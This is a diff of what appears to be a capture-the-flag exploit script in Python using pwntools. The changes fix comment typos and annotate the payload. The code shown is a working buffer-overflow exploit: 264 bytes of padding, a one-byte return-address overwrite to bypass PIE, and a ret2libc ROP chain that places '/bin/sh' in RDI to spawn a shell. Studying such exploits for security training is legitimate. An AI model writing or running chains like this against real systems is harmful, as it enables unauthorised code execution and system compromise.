@@ -30,7 +30,7 @@ def main():
     # """)
     r.recvuntil("...\n")
     
-    # First payload to overwrite the last byte of the return addrss (bypass PIE) since the return address included the base address so, we are just changing the last byte to ovewrite the execusion to yap function
+    # First payload to overwrite the last byte of the return addrss (bypass PIE) since the return address included the base address so, we are just changing the last byte to ovewrite the execution to yap function
     payload1 = flat(
         "A" * 264,
         "\x80"
@@ -67,15 +67,15 @@ def main():
     # Classic ret2libc
     libc_ROP = ROP(libc)
     bin_sh = next(libc.search("/bin/sh\0"))
-    pop_rdi_rbp = libc_ROP.find_gadget(["pop rdi"])[0]  # we already have this gadget from the binary : )
+    pop_rdi_rbp = libc_ROP.find_gadget(["pop rdi"])[0] 
     pop_rsi_rbx = libc_ROP.find_gadget(["pop rsi"])[0]
     pop_rdx = libc_ROP.find_gadget(["pop rdx"])[0]
 
     payload3 = flat(
         "A" * 264,
         p64(pop_rdi_rbp),
-        p64(bin_sh),
-        p64(0),
+        p64(bin_sh), # RDI value (first argument to system) -> address of /bin/ss
+        p64(0), # RBP value -> any (Just a gadget side effect)
         p64(pop_rsi_rbx),
         p64(0), # RSI value (second argument to system) -> 0
         "B"*8, # RBX  value -> any (Just a gadget side effect)
